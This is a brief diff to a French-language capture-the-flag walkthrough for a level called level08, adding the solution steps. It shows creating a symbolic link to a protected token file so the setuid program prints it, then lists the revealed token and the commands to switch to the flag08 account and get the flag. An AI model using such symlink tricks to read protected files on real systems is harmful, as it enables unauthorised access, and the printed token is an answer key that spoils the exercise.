@@ -11,3 +11,9 @@ il faut creer un lien symbolique afin d'aficher le contenu du fichier token
 
     >ln -s ~/token /tmp/display
     >./level08 /tmp/display
+
+
+on obtient le token quif5eloekouj29ke0vouxean
+apres ca
+    >su flag08
+    >getflag
